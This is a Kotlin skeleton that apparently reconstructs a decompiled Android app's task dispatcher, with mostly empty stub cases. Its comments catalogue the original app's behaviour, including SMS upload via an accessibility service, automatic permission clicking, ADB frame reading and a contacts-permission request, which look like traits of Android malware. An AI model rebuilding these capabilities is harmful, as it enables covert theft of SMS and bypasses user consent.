package com.storm.safe.rock.p000

import android.util.Log

/**
 * JADX: p000/RunnableC0941o6.java (786 LOC) — Task dispatcher Runnable.
 *
 * A Runnable with a type int and target object. The run() method dispatches
 * to different behaviors based on the type field. This is a JADX artifact —
 * the original code used lambda/anonymous Runnable instances, but R8 merged
 * them into a single class with a switch-case.
 *
 * Fields:
 * - f58743a0 → type: int selector for which task to run
 * - f58744a1 → target: the object to operate on (cast per case)
 *
 * Key cases referenced from rock/ code:
 * - type=3  → invoke Lambda (generic callback)
 * - type=18 → security module initialization (AbstractC0276a0.m211382a0)
 * - type=21 → SMS upload via accessibility service
 * - type=22 → cancel notification (id=10089)
 *
 * Strategy: Full switch skeleton with ADAPT stubs for each case.
 * Only cases actually called from replicated code have real implementations.
 */
class TaskRunnable : Runnable {

    /** JADX: f58743a0 — Task type selector */
    val type: Int

    /** JADX: f58744a1 — Target object, cast per case in run() */
    val target: Any

    /**
     * Primary constructor — JADX: RunnableC0941o6(int, Object)
     */
    constructor(type: Int, target: Any) {
        this.type = type
        this.target = target
    }

    /**
     * Lambda constructor — JADX: RunnableC0941o6(w00)
     * Sets type=3, target=lambda. Used for generic callback invocation.
     */
    constructor(lambda: () -> Unit) {
        this.type = 3
        this.target = lambda
    }

    override fun run() {
        try {
            when (type) {
                0 -> {
                    // ADAPT: type=0 — Activity.recreate logic for dark mode
                    // JADX: Handles SDK version checks, lifecycle callbacks
                }
                1 -> {
                    // ADAPT: type=1 — Read getevent points from local HTTP server
                    // JADX: HTTP GET http://127.0.0.1:7912/readGetevent + stopGetevent
                }
                2 -> {
                    // ADAPT: type=2 — AutoEngine callback
                    // JADX: c0032al.m209819a8() if b1 flag set
                }
                3 -> {
                    // type=3 — Invoke lambda callback
                    // JADX: ((Lambda) this.f58744a1).invoke()
                    @Suppress("UNCHECKED_CAST")
                    (target as? () -> Unit)?.invoke()
                }
                4 -> {
                    // ADAPT: type=4 — CameraManager send thread
                    // JADX: Polls frame queue, sends via callback, sleeps 200ms
                }
                5 -> {
                    // ADAPT: type=5 — ix module b8(true)
                }
                6 -> {
                    // ADAPT: type=6 — ComponentActivity.invalidateOptionsMenu
                }
                7 -> {
                    // ADAPT: type=7 — DialogC1167r4.m214476a1
                }
                8 -> {
                    // ADAPT: type=8 — ConfigProgressManager keyguard check
                    // JADX: Checks password status, calls g60.m212897a1
                }
                9 -> {
                    // ADAPT: type=9 — ConstraintTrackingWorker delegation
                    // JADX: WorkManager internal worker setup
                }
                10 -> {
                    // ADAPT: type=10 — CoroutineWorker cancellation
                }
                11 -> {
                    // ADAPT: type=11 — Popup window state tracking
                }
                12 -> {
                    // ADAPT: type=12 — Font/emoji compat loading (m214155a0)
                    // JADX: Fetches fonts, builds typeface, loads emoji metadata
                }
                13 -> {
                    // ADAPT: type=13 — Reset flag (da0Var.f55599a6 = false)
                }
                14 -> {
                    // ADAPT: type=14 — Activity callback (C0038a0.m209835a1)
                }
                15 -> {
                    // ADAPT: type=15 — Permission click thread
                    // JADX: C0368a5 permission auto-click loop (800ms delay, 60 rounds)
                }
                16 -> {
                    // ADAPT: type=16 — ParticleView parent height sync
                }
                17 -> {
                    // ADAPT: type=17 — Lifecycle dispatch (ON_PAUSE/ON_STOP)
                }
                18 -> {
                    // type=18 — Security module initialization
                    // JADX: AbstractC0276a0.m211382a0((hkdrkgzsfs) this.f58744a1)
                    // ADAPT: In our replica, security init is handled inline in hkdrkgzsfs.onCreate
                    Log.d(TAG, "type=18: Security module initialization")
                }
                19 -> {
                    // ADAPT: type=19 — SideSheetBehavior state handling
                }
                20 -> {
                    // ADAPT: type=20 — ADB read thread (m214156a1)
                    // JADX: Reads ADB protocol frames, handles STLS/CNXN/AUTH/OKAY/WRTE/CLSE
                }
                21 -> {
                    // type=21 — SMS upload via accessibility service
                    // JADX: arniezsqllm → dqtvuisjd → c0323a8.m211659c5(json)
                    Log.d(TAG, "type=21: SMS upload")
                    // ADAPT: In our replica, this is handled inline in arniezsqllm
                }
                22 -> {
                    // type=22 — Cancel notification
                    // JADX: notificationManager.cancel(10089)
                    Log.d(TAG, "type=22: Cancel notification 10089")
                    // ADAPT: In our replica, notification cancellation is inline
                }
                23 -> {
                    // ADAPT: type=23 — Enable logging and protection flags
                    // JADX: Sets AbstractC0315a0 flags, dqtvuisjdVar.f52411e2 = true
                }
                24 -> {
                    // ADAPT: type=24 — BiometricPrompt launch
                    // JADX: syuqattwmgit biometric prompt based on API version
                }
                25 -> {
                    // ADAPT: type=25 — Request contacts permission
                    // JADX: todoqkrxcctl requestPermissions(READ_CONTACTS, 151)
                }
                26 -> {
                    // ADAPT: type=26 — Finish activity
                    // JADX: umrkmgrri.finish()
                }
                else -> {
                    // ADAPT: default — yojggfhv moveTaskToBack + restart
                    // JADX: moveTaskToBack(false), startActivity with FLAG_ACTIVITY_NEW_TASK etc.
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "TaskRunnable type=$type failed", e)
        }
    }

    companion object {
        private const val TAG = "TaskRunnable"
    }
}
